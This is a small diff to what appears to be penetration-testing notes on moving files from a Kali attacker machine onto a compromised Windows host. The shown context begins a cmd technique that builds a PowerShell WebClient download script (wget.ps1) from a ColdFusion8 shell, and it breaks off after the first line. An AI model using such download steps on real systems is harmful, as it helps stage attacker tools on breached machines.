@@ -2,7 +2,7 @@
 ## Download files from Kali machine to Windows using cmd & powershell
 
 Failed to migrate powershell from cmd. \
-In that case, to download binaries from Kali to Windows, use following commands.\
+In that case, to download binaries from Kali to Windows, use following commands.
 
 ```
 C:\ColdFusion8> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
